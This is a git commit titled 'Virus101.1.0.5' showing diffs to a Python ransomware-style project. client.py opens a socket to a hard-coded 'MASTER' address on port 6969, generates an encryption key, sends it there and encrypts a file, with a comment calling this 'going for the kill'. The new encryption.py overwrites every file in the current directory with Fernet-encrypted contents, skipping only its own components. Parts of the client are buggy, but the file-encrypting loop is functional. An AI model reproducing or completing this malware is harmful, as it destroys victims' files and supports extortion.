81b8e20ab8f6c8f2560c20c42ec33ddcdee3ebfd
Tarmica <lilskyforever@gmail.com>
2022-10-01 23:11:03 +0200

    Virus101.1.0.5

--- client.py
+++ client.py
@@ -1,7 +1,8 @@
-from pathlib import Path
+import os
 from cryptography.fernet import Fernet
 import socket
 import argparse
+
 
 MASTER = "192.168.56.1"
 PORT = 6969
@@ -11,28 +12,35 @@ HEADER = 64
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect(ADDR)
 
+files = []
+ 
+for file in os.listdir():
+    files.append(file)
+
 #reading file path from argument
-parser = argparse.ArgumentParser(prog='Jailor', usage='main.py <full path to file>', description='This program encrypts folders and files given in the path as arguments')
-parser.add_argument('path')
-args = parser.parse_args()
+#parser = argparse.ArgumentParser(prog='Jailor', usage='main.py <full path to file>', description='This program encrypts folders and files given in the path as arguments')
+#parser.add_argument('path')
+#args = parser.parse_args()
 
 #defining file path object to use in code
-filepath = Path(args.path)
+#filepath = Path(args.path)
 
 #manufacturing encryption key, saving encryption key, sending it to master before finally encrypting
 key = Fernet.generate_key()
+with open("thekey.key", "wb") as thekey:
+    thekey.write(key)
 def send(msg):
-    message = msg.encode(FORMAT)
+    message = msg
     msg_length = len(message)
     send_length = str(msg_length).encode(FORMAT)
     send_length += b' ' * (HEADER - len(send_length))
     client.send(send_length)
     client.send(message)
     
-send(key)
-
-open("backup.txt", "w").write(key)
+send(thekey)
+open("backup.txt", "w").write(str(thekey)) 
 
 #finally...going for the kill
-Fernet(key).encrypt(open(filepath))
+#Fernet(key).encrypt(open(filepath))
+Fernet(key).encrypt(open("test.txt"))
 
---
+++ encryption.py
@@ -0,0 +1,22 @@
+import os
+from cryptography.fernet import Fernet 
+
+files = []
+ 
+for file in os.listdir():
+    if file == "client.py" or file == "master.py" or file=="thekey.key":
+        continue
+    files.append(file)
+    
+print(files)
+
+key = Fernet.generate_key()
+with open("thekey.key", "wb") as thekey:
+    thekey.write(key)
+    
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_encrypted)
